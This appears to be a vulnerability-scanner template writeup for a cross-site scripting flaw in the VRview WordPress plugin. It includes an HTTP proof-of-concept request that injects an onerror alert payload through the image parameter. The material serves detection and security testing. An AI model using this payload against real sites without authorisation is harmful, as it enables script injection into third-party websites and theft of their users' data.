# Nuclei Template: VRview Plugin - Cross-Site Scripting
**Template ID:** vrview-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**Source:** Nuclei Template (`vrview-xss.yaml`)

## Vulnerability Information & PoC

## Description
The VRview plugin is a tool commonly used to embed and display 360-degree virtual reality content in web applications. However, improper input sanitization in the plugin allows attackers to inject malicious scripts into trusted websites. This vulnerability, classified as Cross-Site Scripting (XSS), could enable attackers to perform unauthorized actions or steal sensitive user data.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /wp-content/plugins/vrview/vrview/?image=<img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
Host: {{Hostname}}
```

## References
- https://blog.mindedsecurity.com/2018/04/dom-based-cross-site-scripting-in.html
